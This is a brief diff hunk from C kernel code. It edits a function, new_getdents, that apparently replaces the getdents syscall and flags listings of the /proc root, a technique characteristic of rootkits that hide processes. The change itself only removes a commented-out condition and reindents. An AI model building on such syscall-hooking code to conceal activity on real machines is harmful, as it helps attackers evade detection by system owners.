@@ -95,9 +95,8 @@ long new_getdents(const struct pt_regs *pt_regs)
 
     d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
-    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-    /*&& MINOR(d_inode->i_rdev) == 1*/)
-    proc = 1;
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+        proc = 1;
 
     while (off < ret)
     {
